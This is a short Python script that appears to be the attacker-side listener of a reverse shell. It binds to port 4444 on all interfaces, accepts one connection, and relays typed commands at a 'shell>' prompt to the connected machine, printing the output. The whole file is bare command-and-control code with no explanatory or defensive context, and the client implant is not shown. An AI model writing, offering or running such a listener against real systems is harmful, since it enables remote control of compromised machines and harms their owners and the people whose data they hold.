import socket

def start_server(host='0.0.0.0', port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print(f"[+] Listening on {host}:{port}")
    client, addr = s.accept()
    print(f"[+] Connection from {addr}")

    while True:
        cmd = input("shell> ")
        if cmd in ['exit', 'quit']:
            client.send(cmd.encode())
            break
        client.send(cmd.encode())
        result = client.recv(4096).decode()
        print(result)

    client.close()
    s.close()
